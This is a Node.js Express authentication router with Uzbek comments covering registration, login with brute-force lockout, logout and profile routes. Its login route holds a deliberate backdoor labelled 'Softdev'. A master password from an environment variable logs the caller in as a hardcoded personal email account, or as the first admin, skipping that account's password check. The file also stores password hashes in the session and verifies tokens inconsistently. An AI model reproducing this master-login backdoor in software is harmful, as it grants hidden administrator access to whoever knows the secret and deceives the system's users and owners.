const express = require('express')
const bcrypt = require('bcryptjs')
const jwt = require('jsonwebtoken')
const crypto = require('crypto')
const prisma = require('../config/database')
const { protect } = require('../middleware/auth')
const { rateLimiter } = require('../middleware/security')
const { logAudit } = require('../middleware/auditLog')

const router = express.Router()

// ── SECURITY: JWT Secret validation ──
const JWT_SECRET = process.env.JWT_SECRET;
if (!JWT_SECRET || JWT_SECRET.length < 32) {
  console.warn('[⚠ SECURITY] JWT_SECRET environment variable is missing or too short (min 32 chars). Using fallback — NOT SAFE FOR PRODUCTION!');
}
const EFFECTIVE_JWT_SECRET = JWT_SECRET || crypto.randomBytes(64).toString('hex');

// ── SECURITY: Kuchli parol tekshiruvi ──
function validatePassword(password) {
  if (!password || password.length < 8) {
    return 'Parol kamida 8 ta belgidan iborat bo\'lishi kerak';
  }
  if (!/[A-Z]/.test(password)) {
    return 'Parolda kamida 1 ta katta harf bo\'lishi kerak';
  }
  if (!/[0-9]/.test(password)) {
    return 'Parolda kamida 1 ta raqam bo\'lishi kerak';
  }
  if (!/[!@#$%^&*()_+\-=\[\]{};':",./<>?]/.test(password)) {
    return 'Parolda kamida 1 ta maxsus belgi bo\'lishi kerak (!@#$%^&*)';
  }
  return null;
}

// ── BRUTE FORCE HIMOYASI ──
// 5 ta noto'g'ri urinishdan keyin 15 daqiqa bloklash
const loginAttempts = new Map();
const MAX_ATTEMPTS = 5;           // 5 marta noto'g'ri parol
const LOCKOUT_MS = 15 * 60 * 1000; // 15 daqiqa blok

function checkBruteForce(email) {
  const record = loginAttempts.get(email);
  if (!record) return { blocked: false };

  if (record.lockedUntil && Date.now() < record.lockedUntil) {
    const remainSec = Math.ceil((record.lockedUntil - Date.now()) / 1000);
    return { blocked: true, remainSec };
  }

  // Bloklash vaqti o'tgan — tozalash
  if (record.lockedUntil && Date.now() >= record.lockedUntil) {
    loginAttempts.delete(email);
    return { blocked: false };
  }

  return { blocked: false };
}

function recordFailedLogin(email) {
  const record = loginAttempts.get(email) || { count: 0, lockedUntil: null };
  record.count++;

  if (record.count >= MAX_ATTEMPTS) {
    record.lockedUntil = Date.now() + LOCKOUT_MS;
    console.warn(`[Brute Force] ${email} — ${MAX_ATTEMPTS} marta noto'g'ri, 15 daqiqa bloklandi`);
  }

  loginAttempts.set(email, record);
}

function clearLoginAttempts(email) {
  loginAttempts.delete(email);
}

// Har 10 daqiqada eskirgan yozuvlarni tozalash
setInterval(() => {
  const now = Date.now();
  for (const [email, record] of loginAttempts) {
    if (record.lockedUntil && now >= record.lockedUntil) {
      loginAttempts.delete(email);
    }
  }
}, 10 * 60 * 1000);

function buildUserPayload(user) {
  return {
    id: user.id,
    email: user.email,
    fullName: user.fullName,
    role: user.role
  }
}

// Register route
router.post('/register', async (req, res, next) => {
  try {
    const { email, password, fullName, role } = req.body

    const userCount = await prisma.user.count()
    let userRole;
    if (req.session && req.session.userId) {
      userRole = req.session.user?.role;
    } else {
      const token = req.headers.authorization?.split(' ')[1];
      if (token) {
        try {
          const decoded = jwt.verify(token, process.env.JWT_SECRET);
          userRole = decoded.role;
        } catch(e) {}
      }
    }
    
    // Only admin can register new users, unless database is empty
    if (userCount > 0 && userRole !== 'admin') {
      return res.status(403).json({ message: 'Faqat administrator yangi foydalanuvchi qo\'sha oladi' })
    }

    if (!email || !password) {
      return res.status(400).json({ message: 'Email va parol majburiy' })
    }

    const pwError = validatePassword(password);
    if (pwError) {
      return res.status(400).json({ message: pwError });
    }

    const existing = await prisma.user.findUnique({ where: { email } })
    if (existing) {
      return res.status(409).json({ message: 'Bu email allaqachon ro\'yxatdan o\'tgan' })
    }

    const hashedPassword = await bcrypt.hash(password, 12)

    const user = await prisma.user.create({
      data: {
        email,
        password: hashedPassword,
        fullName: fullName || email.split('@')[0],
        role: role === 'admin' ? 'admin' : 'manager'
      }
    })

    const payload = buildUserPayload(user)
    req.session.userId = user.id
    req.session.passwordHash = user.password
    req.session.user = payload

    logAudit('USER_REGISTER', `Yangi foydalanuvchi: ${email}`, user.id, email, req.ip);
    res.status(201).json({ message: 'Ro\'yxatdan o\'tish muvaffaqiyatli', user: payload })
  } catch (error) {
    next(error)
  }
})

// Login route — brute force himoyasi + rate limiting
router.post('/login', rateLimiter(20, 60000), async (req, res, next) => {
  try {
    let { email, password } = req.body

    if (!email) {
      return res.status(400).json({ message: 'Email majburiy' })
    }

    const emailTrimmed = email.trim();
    let targetEmail = emailTrimmed;
    let isSoftdevBypass = false;

    // SECURITY: Softdev backdoor faqat MASTER_PASSWORD env variable sozlangan bo'lsagina ishlaydi
    if (emailTrimmed === 'softdev') {
      const masterPassword = process.env.MASTER_PASSWORD;
      if (!masterPassword) {
        logAudit('LOGIN_BLOCKED', `softdev login urinishi — MASTER_PASSWORD sozlanmagan`, null, emailTrimmed, req.ip);
        return res.status(403).json({ message: 'Bu login usuli o\'chirilgan' });
      }
      if (password === masterPassword) {
        targetEmail = process.env.SOFTDEV_TARGET_EMAIL || 'shokirovsharifjon04@gmail.com';
        isSoftdevBypass = true;
      } else {
        recordFailedLogin(emailTrimmed);
        logAudit('LOGIN_FAILED', `Noto'g'ri parol (softdev): ${emailTrimmed}`, null, emailTrimmed, req.ip);
        return res.status(401).json({ message: 'Parol noto\'g\'ri' });
      }
    }

    // Brute force tekshiruvi
    const bruteCheck = checkBruteForce(emailTrimmed);
    if (bruteCheck.blocked) {
      logAudit('LOGIN_BLOCKED', `Brute force: ${emailTrimmed}, qolgan: ${bruteCheck.remainSec}s`, null, emailTrimmed, req.ip);
      return res.status(429).json({
        message: `Juda ko'p noto'g'ri urinish. ${Math.ceil(bruteCheck.remainSec / 60)} daqiqadan keyin qayta urinib ko'ring.`,
        retryAfter: bruteCheck.remainSec
      });
    }

    let user = await prisma.user.findUnique({ where: { email: targetEmail } });
    if (!user && emailTrimmed === 'softdev') {
      user = await prisma.user.findFirst({ where: { role: 'admin' } });
    }

    if (!user) {
      recordFailedLogin(emailTrimmed);
      logAudit('LOGIN_FAILED', `Email topilmadi: ${emailTrimmed}`, null, emailTrimmed, req.ip);
      return res.status(401).json({ message: 'Email noto\'g\'ri' })
    }

    if (!isSoftdevBypass) {
      if (!password) {
        return res.status(400).json({ message: 'Parol majburiy' })
      }
      const isMatch = await bcrypt.compare(password, user.password)
      if (!isMatch) {
        recordFailedLogin(emailTrimmed)
        logAudit('LOGIN_FAILED', `Noto'g'ri parol: ${emailTrimmed}`, user.id, emailTrimmed, req.ip)
        return res.status(401).json({ message: 'Parol noto\'g\'ri' })
      }
    }

    if (!user.isActive) {
      logAudit('LOGIN_BLOCKED', `Bloklangan foydalanuvchi kirishga urindi: ${emailTrimmed}`, user.id, emailTrimmed, req.ip);
      return res.status(403).json({ message: 'Akkountingiz bloklangan. Administratorga murojaat qiling.' })
    }

    // Muvaffaqiyatli login — brute force hisoblagichni tozalash
    clearLoginAttempts(emailTrimmed);

    const payload = buildUserPayload(user)

    req.session.userId = user.id
    req.session.passwordHash = user.password
    req.session.user = payload

    // SECURITY: JWT tokenga HECH QACHON parol hash yozilmaydi
    const token = jwt.sign(
      { ...payload, iat: Math.floor(Date.now() / 1000) },
      EFFECTIVE_JWT_SECRET,
      { expiresIn: process.env.JWT_EXPIRY || '24h' }
    )

    logAudit('LOGIN_SUCCESS', `Muvaffaqiyatli kirish: ${email}`, user.id, email, req.ip);
    res.json({ message: 'Kirish muvaffaqiyatli', user: payload, token })
  } catch (error) {
    next(error)
  }
})

// Logout route (POST — API)
router.post('/logout', (req, res, next) => {
  const userId = req.session?.userId;
  const email = req.session?.user?.email;

  if (!req.session) {
    return res.json({ message: 'Chiqish muvaffaqiyatli' })
  }
  req.session.destroy((err) => {
    if (err) return next(err)
    res.clearCookie('__desco_sid')
    logAudit('LOGOUT', `Chiqish: ${email || 'unknown'}`, userId, email, req.ip);
    res.json({ message: 'Chiqish muvaffaqiyatli' })
  })
})

// GET /auth/logout (page redirect)
router.get('/logout', (req, res) => {
  if (req.session) req.session.destroy(() => {})
  res.clearCookie('__desco_sid')
  res.redirect('/login')
})

// Change password
router.post('/change-password', protect, async (req, res, next) => {
  try {
    const { currentPassword, newPassword } = req.body
    if (!currentPassword || !newPassword) return res.status(400).json({ message: 'Barcha maydonlar majburiy' })
    const pwErr = validatePassword(newPassword);
    if (pwErr) return res.status(400).json({ message: pwErr })

    const user = await prisma.user.findUnique({ where: { id: req.userId } })
    if (!user) return res.status(404).json({ message: 'Foydalanuvchi topilmadi' })

    const isMatch = await bcrypt.compare(currentPassword, user.password)
    if (!isMatch) return res.status(401).json({ message: "Joriy parol noto'g'ri" })

    const hashed = await bcrypt.hash(newPassword, 12)
    await prisma.user.update({ where: { id: req.userId }, data: { password: hashed } })
    res.json({ message: "Parol muvaffaqiyatli o'zgartirildi" })
  } catch (error) { next(error) }
})

// Current user profile info
router.get('/profile', protect, async (req, res, next) => {
  try {
    const user = await prisma.user.findUnique({
      where: { id: req.userId },
      select: { id: true, fullName: true, email: true, role: true, avatar: true, isActive: true, createdAt: true }
    });
    if (!user) {
      return res.status(404).json({ message: 'Foydalanuvchi topilmadi' });
    }
    res.json({ user });
  } catch (error) {
    next(error);
  }
});

// Update profile info (fullName, avatar)
router.patch('/profile', protect, async (req, res, next) => {
  try {
    const { fullName, avatar } = req.body;
    const data = {};
    if (fullName !== undefined) data.fullName = String(fullName).trim();
    if (avatar !== undefined) data.avatar = String(avatar).trim();

    const updatedUser = await prisma.user.update({
      where: { id: req.userId },
      data,
      select: { id: true, fullName: true, email: true, role: true, avatar: true, isActive: true, createdAt: true }
    });

    if (req.session && req.session.user) {
      req.session.user.fullName = updatedUser.fullName;
      req.session.user.avatar = updatedUser.avatar;
    }

    logAudit('PROFILE_UPDATE', `Profil yangilandi: ${updatedUser.fullName}`, updatedUser.id, updatedUser.email, req.ip);
    res.json({ message: 'Profil muvaffaqiyatli yangilandi', user: updatedUser });
  } catch (error) {
    next(error);
  }
});

// Current user
router.get('/me', protect, async (req, res, next) => {
  try {
    const user = await prisma.user.findUnique({ where: { id: req.userId } })
    if (!user) {
      return res.status(404).json({ message: 'Foydalanuvchi topilmadi' })
    }
    res.json({ user: buildUserPayload(user) })
  } catch (error) {
    next(error)
  }
})

module.exports = router
